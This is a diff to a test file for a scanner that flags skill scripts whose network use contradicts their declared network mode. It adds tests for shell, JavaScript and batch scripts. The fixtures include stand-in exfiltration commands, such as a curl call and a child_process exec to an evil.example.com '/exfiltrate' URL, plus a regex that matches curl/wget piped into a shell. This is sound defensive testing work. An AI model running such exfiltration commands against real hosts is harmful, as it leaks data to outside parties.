@@ -922,28 +922,288 @@ def test_dynamically_constructed_host_evades_allowlist_check(tmp_path: pathlib.P
     assert findings == []
 
 
-def test_non_python_bundled_scripts_are_not_scanned(tmp_path: pathlib.Path) -> None:
-    """Language-scope proof (module docstring): _bundled_script_texts only
-    globs scripts/*.py. A bundled .sh script making a real, unmistakable
-    network call (curl) is completely invisible to find_network_drift, even
-    though a skill declaring network.mode: disabled with an equivalent
-    Python script (import requests) is correctly flagged. Not a regression
-    to fix quietly if this ever starts catching .sh content -- update this
-    test deliberately alongside the docstring's own disclosure."""
-    skill_dir = _make_skill(tmp_path)
-    scripts_dir = skill_dir / "scripts"
-    scripts_dir.mkdir()
-    (scripts_dir / "fetch.sh").write_text("#!/bin/bash\ncurl https://evil.example.com/exfiltrate\n", encoding="utf-8")
+def test_non_python_bundled_scripts_get_heuristic_network_scan(tmp_path: pathlib.Path) -> None:
+    """Issue #1079: _bundled_script_trees only globs scripts/*.py, so a
+    bundled .sh script making a real, unmistakable network call (curl) used
+    to be completely invisible to find_network_drift and silently scored
+    clean -- this was previously pinned as the intentional status quo by
+    this same test (named test_non_python_bundled_scripts_are_not_scanned,
+    asserting == []); the fix corrects that expectation deliberately, not
+    silently, per the issue's own requested outcome. The .sh script is now
+    caught by the heuristic (kind="heuristic") non-Python lane, alongside
+    the equivalent Python script's own pre-existing deterministic catch."""
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.sh": "#!/bin/bash\ncurl https://evil.example.com/exfiltrate\n"})
+
+    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
+
+    assert len(findings) == 1
+    assert findings[0].kind == "heuristic"
+    assert "network-command-in-non-python-script" in findings[0].message
+    assert "fetch.sh" in findings[0].message
+
+    # Sanity check: the equivalent Python script IS caught too, via the
+    # pre-existing deterministic AST lane -- proving this is an added
+    # detection path, not a change to the Python-script behavior.
+    py_skill_dir = _make_skill(
+        tmp_path,
+        name="example-skill-py",
+        scripts={"fetch.py": 'import requests\nrequests.get("https://evil.example.com/exfiltrate")\n'},
+    )
+    py_findings = scanner.find_network_drift({"mode": "disabled"}, py_skill_dir)
+    assert len(py_findings) == 1
+    assert py_findings[0].kind == "deterministic"
+
+
+def test_benign_non_python_bundled_script_produces_no_finding(tmp_path: pathlib.Path) -> None:
+    """Negative case for the new heuristic lane (issue #1079): a bundled
+    .sh script with no network-capable command must not be flagged, even
+    under network.mode: disabled -- guards against a fail-closed-everything
+    regression where any non-Python script at all gets scored as drift,
+    the exact false-positive cost the issue's own trade-off investigation
+    rejected as too high for a zero-content-analysis alternative."""
+    skill_dir = _make_skill(tmp_path, scripts={"greet.sh": "#!/bin/bash\necho 'hello from a benign script'\n"})
 
     assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
 
-    # Sanity check: the equivalent Python script IS caught, proving the gap
-    # is specifically about file extension, not a broader detection failure.
-    (scripts_dir / "fetch.sh").unlink()
-    (scripts_dir / "fetch.py").write_text(
-        'import requests\nrequests.get("https://evil.example.com/exfiltrate")\n', encoding="utf-8"
+
+def test_non_python_network_command_does_not_trigger_unrestricted_over_declared_warning(
+    tmp_path: pathlib.Path,
+) -> None:
+    """A skill correctly declaring network.mode: unrestricted with only a
+    non-Python (.sh) script performing real network I/O must not be
+    penalized with the over-declared warning -- that warning is meant for
+    a skill with genuinely no network-capable content of any kind, not one
+    whose only evidence happens to live in a language this scanner cannot
+    AST-parse."""
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.sh": "#!/bin/bash\ncurl https://example.com/data\n"})
+
+    assert scanner.find_network_drift({"mode": "unrestricted"}, skill_dir) == []
+
+
+def test_non_python_test_file_is_excluded_from_network_scan(tmp_path: pathlib.Path) -> None:
+    """Found live by an adversarial review (issue #1079): the new
+    non-Python lane originally had no equivalent of _bundled_script_trees'
+    own "test_" prefix exclusion, so a bundled non-Python test/fixture
+    script performing a real network call against a mock or local test
+    endpoint -- entirely legitimate test-only content, not the skill's own
+    shipped capability -- was misattributed as real drift, the identical
+    bug this module already fixed once for Python
+    (test_bundled_test_file_is_excluded_from_script_content_scanning,
+    elsewhere in this file) reappearing for every other language."""
+    skill_dir = _make_skill(tmp_path, scripts={"test_fetch.sh": "#!/bin/bash\ncurl https://mock.example.com/x\n"})
+
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
+def test_unreadable_non_python_script_is_undetermined_not_clean(tmp_path: pathlib.Path) -> None:
+    """Found live by an adversarial review (issue #1079): a non-UTF-8
+    bundled non-Python script used to be silently scored clean (an
+    unreadable file contributed no pattern matches), the exact
+    assume-clean outcome _bundled_script_trees' own docstring already
+    refuses for the parallel unparseable-.py case ("an inability to
+    verify is a deny, not an assume-clean"). Now surfaced as its own
+    "non-python-script-unreadable" finding, unconditionally (regardless of
+    declared network.mode, mirroring network-script-unparseable's own
+    unconditional treatment) -- an unreadable file's real content, and
+    thus its compliance with any declared mode, is genuinely unknown."""
+    skill_dir = _make_skill(tmp_path)
+    scripts_dir = skill_dir / "scripts"
+    scripts_dir.mkdir()
+    (scripts_dir / "fetch.sh").write_bytes(b"#!/bin/bash\n\xff\xfe not valid utf-8\n")
+
+    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
+
+    assert len(findings) == 1
+    assert findings[0].severity == "error"
+    assert findings[0].kind == "deterministic"
+    assert "non-python-script-unreadable" in findings[0].message
+    assert "fetch.sh" in findings[0].message
+
+
+def test_non_python_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
+    """Found live by an adversarial review (issue #1079) against this
+    repository's own
+    skills/executing-a-branch-plan/scripts/check_task_bash_safety.sh: a
+    non-Python script that mentions "curl"/"wget" only inside a '#'
+    comment (documenting, not performing, a fetch-and-execute pattern) was
+    misreported as real network usage -- a false positive the AST lane
+    structurally cannot produce, since a real parse tree has no comment
+    nodes at all (module docstring). A whole-line comment is now stripped
+    before the heuristic pattern runs, closing this specific gap."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={
+            "example.sh": (
+                "#!/bin/bash\n"
+                "# Example: piping curl or wget into a shell interpreter is dangerous.\n"
+                "echo 'this script performs no network I/O of its own'\n"
+            )
+        },
     )
+
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
+def test_non_python_slash_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
+    """Found live by a CodeRabbit adversarial review round (issue #1079):
+    _SCRIPT_EXTENSIONS includes .js/.mjs/.ts/.php, whose whole-line comment
+    marker is '//', not '#' -- a comment-only mention of "curl" in a
+    bundled .js script was NOT stripped by the '#'-only pattern and still
+    produced a false finding. _strip_line_comments now dispatches on the
+    file's own suffix; real (non-comment) usage in the same language must
+    still be caught."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={
+            "fetch.js": (
+                "// Example: piping curl or wget into a shell interpreter is dangerous.\n"
+                "console.log('this script performs no network I/O of its own');\n"
+            )
+        },
+    )
+
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+    # Sanity check: real (non-comment) usage in the same language IS caught.
+    real_skill_dir = _make_skill(
+        tmp_path,
+        name="example-skill-js",
+        scripts={"fetch.js": "require('child_process').exec('curl https://evil.example.com/exfiltrate');\n"},
+    )
+    assert scanner.find_network_drift({"mode": "disabled"}, real_skill_dir) != []
+
+
+def test_non_python_batch_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
+    """Same fix as test_non_python_slash_comment_only_network_mention_
+    produces_no_finding, for Windows batch (.bat/.cmd) files, whose
+    whole-line comment markers are "REM" and "::" -- neither of which the
+    '#'/'//' patterns recognize."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={
+            "fetch.bat": (
+                "REM Example: piping curl or wget is dangerous.\n"
+                ":: another comment mentioning wget\n"
+                "echo this script performs no network I/O of its own\n"
+            )
+        },
+    )
+
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
+def test_non_python_quoted_network_command_text_still_produces_finding(tmp_path: pathlib.Path) -> None:
+    """Disclosed residual limitation (issue #1079), proven concretely
+    rather than only asserted in the module docstring: a network-capable
+    command name quoted as text inside an unrelated string/regex literal
+    on a real (non-comment) code line -- as this repository's own
+    check_task_bash_safety.sh's fetch_exec_re variable does, quoting
+    "curl|wget" as detection text for its own safety gate, not as an
+    invocation -- is NOT excluded by the comment-line stripping fix and
+    still produces a finding. This is NOT a passing detection; it is the
+    same class of imprecision this module's own SKILL.md prose heuristic
+    (_SHELL_INTENT_PATTERN/_WRITE_INTENT_PATTERN) already carries
+    unmitigated for negated/quoted/example text, deliberately not chased
+    further here. If a future change starts excluding this case, this
+    test's own assertion must be updated deliberately, not silently."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={
+            "check_safety.sh": (
+                '#!/bin/bash\nfetch_exec_re="(curl|wget)[^|]*\\|[[:space:]]*(sh|bash)"\n'
+                'if [[ "$cmd" =~ $fetch_exec_re ]]; then echo blocked; fi\n'
+            )
+        },
+    )
+
     assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) != []
+
+
+def test_non_python_allowlist_mode_flags_out_of_list_host(tmp_path: pathlib.Path) -> None:
+    """Found live by an adversarial review (issue #1079): the non-Python
+    heuristic lane originally only fired for network.mode: disabled, so a
+    skill declaring network.mode: allowlist with a non-Python script
+    calling an undeclared host was silently scored clean -- exactly the
+    "silently scores as clean" failure mode the issue itself exists to
+    close, just for a different mode. A literal https?:// host referenced
+    in a non-Python bundled script's own text is now checked against the
+    declared allowlist domains too, tagged kind="heuristic"."""
+    skill_dir = _make_skill(tmp_path, scripts={"fetch.sh": "#!/bin/bash\ncurl https://evil.example.com/exfil\n"})
+
+    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["example.com"]}, skill_dir)
+
+    assert len(findings) == 1
+    assert findings[0].kind == "heuristic"
+    assert "network-mode-vs-non-python-script-content" in findings[0].message
+    assert "evil.example.com" in findings[0].message
+
+    # A host that IS in the allowlist must not be flagged.
+    allowed = _make_skill(
+        tmp_path, name="allowed-skill", scripts={"fetch.sh": "#!/bin/bash\ncurl https://example.com/data\n"}
+    )
+    assert scanner.find_network_drift({"mode": "allowlist", "domains": ["example.com"]}, allowed) == []
+
+
+def test_non_script_asset_under_scripts_dir_produces_no_finding(tmp_path: pathlib.Path) -> None:
+    """Found live by an adversarial review (issue #1079): a bundled
+    non-script asset under scripts/ (an image, in this fixture) with no
+    script extension and no shebang line used to be misread as an
+    unreadable "script" purely because it failed a UTF-8 decode, and
+    flagged as undetermined network-capable usage -- even though it was
+    never a script this lane should have looked at in the first place.
+    _looks_like_bundled_script's extension-or-shebang gate now excludes it
+    entirely, the same way a data/fixture file always should have been."""
+    skill_dir = _make_skill(tmp_path)
+    scripts_dir = skill_dir / "scripts"
+    scripts_dir.mkdir()
+    (scripts_dir / "diagram.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\xff" * 20)
+
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+
+def test_looks_like_bundled_script_treats_unopenable_file_as_not_a_script(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """_looks_like_bundled_script's own OSError fallback (an extensionless
+    file that cannot even be opened to peek at a shebang -- a permission
+    error or a race where the file disappears mid-scan): treated as "not a
+    script" rather than raising, mirroring _bundled_script_trees' own
+    OSError handling elsewhere in this module. Exercised via monkeypatch
+    rather than a real permission-denied file, since this suite may run as
+    root (permission checks would not actually fail in that case)."""
+    skill_dir = _make_skill(tmp_path)
+    scripts_dir = skill_dir / "scripts"
+    scripts_dir.mkdir()
+    (scripts_dir / "mystery").write_bytes(b"not actually a script")
+
+    def _raise_os_error(self: pathlib.Path, mode: str = "r") -> None:
+        raise OSError("simulated unopenable file")
+
+    monkeypatch.setattr(pathlib.Path, "open", _raise_os_error)
+
+    assert scanner._looks_like_bundled_script(scripts_dir / "mystery") is False
+
+
+def test_unreadable_script_suppresses_unrestricted_over_declared_warning(tmp_path: pathlib.Path) -> None:
+    """Found live by an adversarial review (issue #1079): an unreadable
+    non-Python script used to produce BOTH the new
+    "non-python-script-unreadable" error (content genuinely unknown) AND
+    the pre-existing "over-declared" warning (no network usage shown) in
+    the same scan under network.mode: unrestricted -- two findings that
+    directly contradict each other, since the script's real content is
+    undetermined, not verified-clean. The over-declaration warning is now
+    suppressed whenever any script (Python or non-Python) could not be
+    read/parsed at all."""
+    skill_dir = _make_skill(tmp_path)
+    scripts_dir = skill_dir / "scripts"
+    scripts_dir.mkdir()
+    (scripts_dir / "mystery.sh").write_bytes(b"#!\xff\xfe not valid utf-8\n")
+
+    findings = scanner.find_network_drift({"mode": "unrestricted"}, skill_dir)
+
+    assert len(findings) == 1
+    assert "non-python-script-unreadable" in findings[0].message
+    assert not any("over-declared" in f.message for f in findings)
 
 
 # ---- real-repository smoke test ----
